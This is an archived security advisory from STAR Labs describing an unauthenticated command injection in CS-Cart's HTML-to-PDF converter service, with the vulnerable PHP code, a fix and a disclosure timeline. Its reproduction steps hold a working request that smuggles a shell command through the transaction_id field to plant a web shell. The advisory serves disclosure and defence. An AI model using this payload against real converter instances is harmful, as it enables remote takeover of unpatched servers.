---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-03-03_cs-cart-pdf-plugin-unauthenticated-command-injection.md
original_filename: 2023-03-03_cs-cart-pdf-plugin-unauthenticated-command-injection.md
title: CS-Cart PDF Plugin Unauthenticated Command Injection
category: documents
detected_topics:
- command-injection
- sso
- path-traversal
tags:
- imported
- documents
- command-injection
- sso
- path-traversal
language: en
raw_sha256: 9ee3137ae295b7c1227d3f4d01777b6e25c314a6bbbfb5d505fbb22b33378c46
text_sha256: 353eb3505fdfbca546e59d39aea529b783bf741fc4c55270cb907f6e362ef476
ingested_at: '2026-06-28T07:32:19Z'
sensitivity: unknown
redactions_applied: false
---

# CS-Cart PDF Plugin Unauthenticated Command Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-03-03_cs-cart-pdf-plugin-unauthenticated-command-injection.md
- Source Type: markdown
- Detected Topics: command-injection, sso, path-traversal
- Ingested At: 2026-06-28T07:32:19Z
- Redactions Applied: False
- Raw SHA256: `9ee3137ae295b7c1227d3f4d01777b6e25c314a6bbbfb5d505fbb22b33378c46`
- Text SHA256: `353eb3505fdfbca546e59d39aea529b783bf741fc4c55270cb907f6e362ef476`


## Content

---
title: "CS-Cart PDF Plugin Unauthenticated Command Injection"
page_title: "CS-Cart PDF Plugin Unauthenticated Command Injection | STAR Labs"
url: "https://starlabs.sg/blog/2023/03-cs-cart-pdf-plugin-unauthenticated-command-injection/"
final_url: "https://starlabs.sg/blog/2023/03-cs-cart-pdf-plugin-unauthenticated-command-injection/"
authors: ["Ngo Wei Lin (@Creastery)"]
programs: ["CS-Cart"]
bugs: ["RCE", "OS command injection", "Security code review"]
publication_date: "2023-03-03"
added_date: "2023-03-06"
source: "pentester.land/writeups.json"
original_index: 1436
---

Research March 3, 2023 By Ngo Wei Lin 4 min read

# CS-Cart PDF Plugin Unauthenticated Command Injection

Table of Contents

  * Summary
  * Product Background
  * Confirmed Vulnerable Versions
  * Security Impact
  * Proposed CVSS3.1 Rating
  * Decription of the Vulnerability
  * Steps to Reproducing
  * Recommendations
  * Discovery Credits
  * Timeline

## Summary

A command injection vulnerability exists in CS-Cart’s HTML to PDF converter (<https://github.com/cscart/pdf>) allowing unauthenticated attackers to achieve remote command execution (RCE). The vulnerability only affects the HTML to PDF converter service and the default hosted service at `converter.cart-services.com` (maintained by CS-Cart’s development team) used by the PDF converter plugin, and does not allow for RCE against base installations of CS-Cart.

## Product Background

In CS-Cart v4.13.2, the HTML to PDF converter is an optional plugin (disabled by default) for printing PDF documents in CS-Cart. However, the plugin is built-in and enabled by default in CS-Cart v4.13.1 or below.

Note that the affected product refers to the external service used for converting HTML to PDF, which can be self-hosted.

## Confirmed Vulnerable Versions

All versions of the CS-Cart HTML to PDF converter service [cscart/pdf](https://github.com/cscart/pdf) up to and including commit [0e8c5bb](https://github.com/cscart/pdf/commit/0e8c5bbc7867821b2d8296683f8e5d586e39fd67) are vulnerable.

## Security Impact

An unauthenticated attacker is able to obtain remote code execution via the PDF converter service.

## Proposed CVSS3.1 Rating

`Base Score - 9.8 (Critical) CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

## Decription of the Vulnerability

The request body is JSON-decoded as an associative object in [`/index.php`](https://github.com/cscart/pdf/blob/0e8c5bbc7867821b2d8296683f8e5d586e39fd67/index.php#L18-L23):
  
  
  ...
  $r = new Router(APP_WEB);
  
  $r->post('/pdf/render', function() {
  $request = json_decode(file_get_contents('php://input'), true);
  return Converter::convert($request);
  })->accept(Response::pdf());
  ...
  

The vulnerability can be found in the `Converter::convert($params)` function declared in `/app/Pdfc/Converter.php`:
  
  
  <?php
  
  namespace Pdfc;
  
  class Converter
  {
  ...
  static public function convert($params)
  {
  ...
  if (!empty($params['content'])) {
  
  $transaction_id = '';
  if (!empty($params['transaction_id'])) {
  $transaction_id = $params['transaction_id']; // [1]
  } else {
  $transaction_id = md5(uniqid('', true));
  }
  
  $html_file = APP_DIR . '/files/' . $transaction_id . '.html'; // [2]
  $pdf_file = APP_DIR . '/files/' . $transaction_id . '.pdf';  // [3]
  @file_put_contents($html_file, $params['content']);  // [4]
  
  $cmd = self::getBinPath() . ' ' . self::formParams($params) . ' ' . $html_file . ' ' . $pdf_file; // [5]
  exec($cmd); // [6]
  
  $contents = @file_get_contents($pdf_file);
  unlink($html_file);
  unlink($pdf_file);
  }
  
  return $contents;
  }
  ...
  }
  

At `[1]`, `$params['transaction_id']` is a user input obtained from the request body’s JSON object.  
At `[2]` and `[3]`, the file paths to the respective HTML and PDF files are constructed using the user input at `[1]`. However, since the user input is not validated and sanitised, `$transaction_id` may contain arbitrary characters.  
At `[4]`, file write beyond in the intended `/files/` directory is possible with a path traversal payload (i.e. using `../` in `$transaction_id`). While this is irrelevant to the command injection vulnerability, it is worth noting and fixing.  
At `[5]`, a shell command is constructed using the `$html_file` and `$pdf_file` from `[2]` and `[3]` respectively without properly escaping the arguments containing untrusted user input. Subsequently, the command is executed within a shell at `[6]`, thereby allowing for remote command execution.

The following endpoints may be exploited to invoke the vulnerable `Converter::convert()` function with user-controlled values:

  1. `/pdf/render` (POST)
  2. `/pdf/batch/add` (POST) in conjunction with `/pdf/batch/render/*` (GET/POST)

## Steps to Reproducing

  1. Set up the HTML to PDF converter infrastructure in a Docker environment as per the instructions listed at <https://github.com/cscart/pdf-infrastructure>.
  2. Issue the following HTTP request to exploit the command injection vulnerability to append PHP code to the router file at `/index.php`:

  
  
  POST /pdf/render HTTP/1.1
  Host: localhost
  Content-Type: application/json
  Accept: */*
  Content-Length: 180
  
  {"content":" ","transaction_id":"; echo '$r->get(\"/rce\", function() { return shell_exec($_GET[\"cmd\"]); })->accept(Response::status());' >> /var/www/html/genworker/index.php #"}
  

  3. Navigate to `http://localhost:80/index.php?cmd=id`, and observe that the output of the `id` command is returned:

  
  
  uid=2(daemon) gid=2(daemon) groups=1(bin),2(daemon),2(daemon),4(adm)
  

## Recommendations

Ensure that user input is validated and sanitised before using them to construct shell commands. In this particular case, a simple fix will be to escape each command argument accordingly:
  
  
  ...
  $html_file = APP_DIR . '/files/' . $transaction_id . '.html';
  $pdf_file = APP_DIR . '/files/' . $transaction_id . '.pdf';
  @file_put_contents($html_file, $params['content']);
  
  $cmd = self::getBinPath() . ' ' . self::formParams($params) . ' ' . escapeshellarg($html_file) . ' ' . escapeshellarg($pdf_file);
  exec($cmd);
  ...
  

While the above code snippet fixes the command injection vulnerability, do note that appropriate validation checks still needs to be implemented prevent path traversal attacks via `$transaction_id`.

Fortunately for all CS-Cart users, they have found it internally too. This was their response to us.

> We highly appreciate your efforts applied on finding this vulnerability and clearly see your professional approach.
> 
> Fortunately, we learned about this issue not long ago, as a result of our internal audit, and have already completely changed all the logic used by this service so that it can no longer be affected by this vulnerability:
> 
> <https://github.com/cscart/pdf-infrastructure/commit/0b4b11cf254d8556fbd13d442ba9ea8e8dc3db64> <https://github.com/cscart/pdf/commit/b49d68eeb35b08ed08f90eaea04eca7ef397bc97>
> 
> So now this vulnerability no longer applicable and cannot affect the service.

**NOTE:** While the hosted service provided by vendor has been fixed, users that are self-hosting the HTML to PDF converter service will need to update and patch accordingly.

## Discovery Credits

Ngo Wei Lin ([@Creastery](https://twitter.com/creastery)) of STAR Labs ([@starlabs_sg](https://twitter.com/starlabs_sg))

## Timeline

  * 09-02-2023 - Vendor Disclosure
  * 13-02-2023 - Vendor acknowledged but it was fixed a few days before we reported it
  * 03-03-2023 - Public Release
